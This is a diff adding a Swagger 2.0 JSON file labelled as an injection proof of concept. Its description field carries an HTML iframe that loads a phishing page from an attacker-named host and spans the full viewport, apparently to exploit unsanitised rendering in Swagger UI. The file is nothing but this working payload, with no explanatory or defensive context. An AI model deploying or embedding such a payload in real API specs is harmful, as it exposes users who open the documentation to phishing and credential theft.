@@ -1,0 +1,10 @@
+{
+    "swagger": "2.0",
+    "info": {
+      "title": "Arborg Injection PoC",
+      "version": "1.0.0",
+      "description": "<iframe src='https://evil.kalli.is/phish' style='width:100%;height:800px;border:none'></iframe>"
+    },
+    "paths": {}
+  }
+  
